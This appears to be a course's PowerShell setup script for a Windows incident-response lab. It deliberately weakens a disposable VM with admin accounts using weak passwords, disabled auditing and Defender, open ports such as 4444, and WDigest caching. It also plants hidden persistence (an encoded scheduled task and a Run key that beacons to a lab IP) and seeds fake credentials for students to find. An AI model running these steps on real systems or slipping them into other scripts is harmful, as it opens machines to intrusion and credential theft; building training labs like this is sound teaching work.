#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Sets up the Windows Security Operations Lab environment.
    Creates intentional misconfigurations, weak accounts, persistence mechanisms,
    and breadcrumbs for students to discover.

.DESCRIPTION
    DO NOT RUN ON PRODUCTION SYSTEMS.
    This script intentionally weakens the security posture of the machine
    for educational purposes. Use only on a disposable VM.

.NOTES
    Course:  6592 - Cloud Security
    Lab:     Windows Security Operations
    Author:  Course Staff
#>

Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  Windows Security Operations Lab Setup"    -ForegroundColor Cyan
Write-Host "  DO NOT RUN ON PRODUCTION SYSTEMS"         -ForegroundColor Red
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

$confirm = Read-Host "This will intentionally misconfigure this machine. Type 'YOURISK' to continue"
if ($confirm -ne "YOURISK") {
    Write-Host "Setup cancelled." -ForegroundColor Yellow
    exit
}

Write-Host "`n[*] Phase 1: Creating accounts and groups..." -ForegroundColor Green

# --- Weak local accounts ---
$weakPassword = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$seasonPassword = ConvertTo-SecureString "Summer2025" -AsPlainText -Force
$blankPassword = ConvertTo-SecureString " " -AsPlainText -Force

# Create accounts with weak passwords
New-LocalUser -Name "svc_backup" -Password $weakPassword -Description "Backup service account" -PasswordNeverExpires -ErrorAction SilentlyContinue
New-LocalUser -Name "svc_monitor" -Password $seasonPassword -Description "Monitoring agent" -PasswordNeverExpires -ErrorAction SilentlyContinue
New-LocalUser -Name "testadmin" -Password $weakPassword -Description "Temporary admin - remove after migration" -PasswordNeverExpires -ErrorAction SilentlyContinue
New-LocalUser -Name "dev_deploy" -Password $seasonPassword -Description "CI/CD deployment account" -PasswordNeverExpires -ErrorAction SilentlyContinue
New-LocalUser -Name "intern2024" -Password $weakPassword -Description "Intern account - summer 2024" -PasswordNeverExpires -ErrorAction SilentlyContinue

# Add accounts to inappropriate groups
Add-LocalGroupMember -Group "Administrators" -Member "testadmin" -ErrorAction SilentlyContinue
Add-LocalGroupMember -Group "Administrators" -Member "svc_backup" -ErrorAction SilentlyContinue
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "intern2024" -ErrorAction SilentlyContinue
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "dev_deploy" -ErrorAction SilentlyContinue

# Enable the Guest account
Get-LocalUser -Name "Guest" | Enable-LocalUser -ErrorAction SilentlyContinue

Write-Host "[*] Phase 2: Weakening password policy..." -ForegroundColor Green

# Weaken password policy via secedit
$secTemplate = @"
[System Access]
MinimumPasswordLength = 4
PasswordComplexity = 0
MaximumPasswordAge = -1
MinimumPasswordAge = 0
PasswordHistorySize = 0
LockoutBadCount = 0
"@
$secTemplate | Out-File -FilePath "$env:TEMP\weakpolicy.inf" -Encoding ASCII
secedit /configure /db "$env:TEMP\weak.sdb" /cfg "$env:TEMP\weakpolicy.inf" /areas SECURITYPOLICY /quiet

Write-Host "[*] Phase 3: Creating suspicious services and tasks..." -ForegroundColor Green

# --- Unquoted service path ---
$svcDir = "C:\Program Files\Lab Monitoring\Agent Service"
New-Item -Path $svcDir -ItemType Directory -Force | Out-Null
"REM Placeholder service binary" | Out-File "$svcDir\monitor.exe" -Encoding ASCII
sc.exe create "LabMonitorSvc" binpath= "C:\Program Files\Lab Monitoring\Agent Service\monitor.exe" start= auto obj= LocalSystem 2>$null

# --- Service running as LocalSystem that shouldn't ---
sc.exe create "LabWebHelper" binpath= "C:\Windows\System32\cmd.exe /c echo running" start= demand obj= LocalSystem 2>$null

# --- Suspicious scheduled tasks ---
$action1 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -EncodedCommand UABpAG4AZwAgADEAMAAuADEAMAAuADEAMAAuADEAMAA="
$trigger1 = New-ScheduledTaskTrigger -AtLogOn
$principal1 = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "SystemHealthCheck" -Action $action1 -Trigger $trigger1 -Principal $principal1 -Description "System health monitoring" -ErrorAction SilentlyContinue

$action2 = New-ScheduledTaskAction -Execute "cmd.exe" -Argument '/c net user svc_backup Password123! /Y'
$trigger2 = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday -At "03:00"
Register-ScheduledTask -TaskName "WeeklyMaintenance" -Action $action2 -Trigger $trigger2 -Description "Weekly maintenance job" -ErrorAction SilentlyContinue

Write-Host "[*] Phase 4: Planting persistence mechanisms..." -ForegroundColor Green

# --- Registry run keys ---
$regPayload = 'powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://10.10.10.99/beacon -UseBasicParsing"'
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsHealthService" -Value $regPayload -ErrorAction SilentlyContinue

# --- Startup folder dropper ---
$startupPath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
'@echo off
REM System optimisation tool
powershell.exe -WindowStyle Hidden -Command "Start-Sleep -Seconds 300; Get-Process | Out-File C:\Windows\Temp\sysinfo.txt"' | Out-File "$startupPath\optimize.bat" -Encoding ASCII -ErrorAction SilentlyContinue

Write-Host "[*] Phase 5: Weakening firewall and audit policy..." -ForegroundColor Green

# --- Open firewall too broadly ---
New-NetFirewallRule -DisplayName "App Debug Port" -Direction Inbound -Protocol TCP -LocalPort 4444 -Action Allow -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "Legacy Monitoring" -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "Dev Tools" -Direction Inbound -Protocol TCP -LocalPort 1337 -Action Allow -ErrorAction SilentlyContinue

# --- Disable some audit policies ---
auditpol /set /subcategory:"Logon" /failure:disable /quiet
auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable /quiet
auditpol /set /subcategory:"Security Group Management" /success:disable /quiet

Write-Host "[*] Phase 6: Scattering credential breadcrumbs..." -ForegroundColor Green

# --- Credentials in files ---
$credsDir = "C:\Scripts"
New-Item -Path $credsDir -ItemType Directory -Force | Out-Null

'# Database backup script
$server = "db-prod-01.internal"
$username = "sa"
$password = "Pr0duction!DB#2024"
# TODO: move to secrets manager
Invoke-Sqlcmd -ServerInstance $server -Username $username -Password $password -Query "BACKUP DATABASE AppDB TO DISK = ''D:\Backups\AppDB.bak''"' | Out-File "$credsDir\backup-database.ps1" -Encoding UTF8

'[aws]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
region = ap-southeast-2' | Out-File "$credsDir\config.ini" -Encoding UTF8

'SET DB_HOST=rds-prod.abc123.ap-southeast-2.rds.amazonaws.com
SET DB_USER=admin
SET DB_PASS=MyS3cretP@ss!
SET API_KEY=sk-proj-abc123def456ghi789' | Out-File "$credsDir\deploy-env.bat" -Encoding ASCII

# --- PowerShell history with sensitive commands ---
$psHistoryDir = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
New-Item -Path $psHistoryDir -ItemType Directory -Force | Out-Null
@"
Get-Service
cd C:\Scripts
.\backup-database.ps1
net user svc_sql S3cureP@ss2024 /add
net localgroup Administrators svc_sql /add
Invoke-WebRequest -Uri https://releases.example.com/agent.exe -OutFile C:\Temp\agent.exe
Set-ExecutionPolicy Unrestricted
aws s3 cp s3://company-secrets/keys.zip C:\Temp\keys.zip
"@ | Out-File "$psHistoryDir\ConsoleHost_history.txt" -Encoding UTF8

Write-Host "[*] Phase 7: Miscellaneous weaknesses..." -ForegroundColor Green

# --- PowerShell execution policy set to Unrestricted ---
Set-ExecutionPolicy Unrestricted -Force -ErrorAction SilentlyContinue

# --- Disable Windows Defender real-time protection (if possible) ---
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
} catch {
    Write-Host "    [!] Could not disable Defender (may be tamper-protected)" -ForegroundColor Yellow
}

# --- SMB v1 enabled ---
try {
    Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol" -NoRestart -ErrorAction SilentlyContinue | Out-Null
} catch {
    Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force -ErrorAction SilentlyContinue
}

# --- Disable NLA for RDP ---
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0 -ErrorAction SilentlyContinue

# --- WDigest credential caching enabled ---
New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Force -ErrorAction SilentlyContinue | Out-Null
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1 -ErrorAction SilentlyContinue

# --- Leave a "flag" file for the IR phase ---
$flagDir = "C:\Windows\Temp"
'TLP:RED - INTERNAL INVESTIGATION
Analyst: SOC-LEAD
Date: 2025-01-15
Subject: Suspected credential exfiltration

Initial finding: Anomalous outbound connections to 10.10.10.99 from this host.
Process: powershell.exe spawned by scheduled task "SystemHealthCheck".
Encoded command decoded to: Ping 10.10.10.10
Further encoded payloads may exist in registry Run keys.
LSASS memory access detected from non-standard process at 2025-01-15T02:14:33Z.

ACTION REQUIRED: Full investigation needed. Check all persistence mechanisms,
credential exposure, and lateral movement indicators.' | Out-File "$flagDir\incident-notes.txt" -Encoding UTF8

Write-Host ""
Write-Host "============================================" -ForegroundColor Green
Write-Host "  Lab environment setup complete!"           -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green
Write-Host ""
Write-Host "Misconfigurations planted:" -ForegroundColor Yellow
Write-Host "  - Weak and stale user accounts"
Write-Host "  - Weakened password policy"
Write-Host "  - Suspicious services and scheduled tasks"
Write-Host "  - Persistence mechanisms (registry, startup)"
Write-Host "  - Overly permissive firewall rules"
Write-Host "  - Disabled audit policies"
Write-Host "  - Credentials in plaintext files"
Write-Host "  - Insecure protocols and settings"
Write-Host "  - An incident investigation trail"
Write-Host ""
Write-Host "Open missions.md and begin Phase 1." -ForegroundColor Cyan
